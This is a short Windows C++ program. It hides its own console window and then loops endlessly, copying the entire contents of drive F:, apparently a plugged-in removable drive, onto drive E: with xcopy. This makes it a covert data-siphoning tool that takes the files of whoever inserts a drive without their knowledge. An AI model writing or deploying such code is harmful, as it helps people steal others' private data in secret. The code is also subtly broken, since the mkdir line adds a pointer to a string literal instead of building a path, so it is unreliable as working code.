#include<iostream>
using namespace std;
#include<math.h>
#include<time.h>
#include<string.h>
#include<algorithm>
#include<stdio.h>
#include<conio.h>
#include<stdlib.h>
#include<windows.h>
 #include <direct.h>
#include <ctime>
main()
{
      //time_t t = time(0);
     // cout<<t;
  //    int t;
//cin>>t;
char date[9];
	_strdate(date);
HWND hwnd_win = GetForegroundWindow();
ShowWindow(hwnd_win,SW_HIDE);
mkdir("e:/"+date);
while(1)
{
if(!(system ("F:")))
{
             
            system("xcopy F:\\ E:\\ /e");
}
}
getch();
}
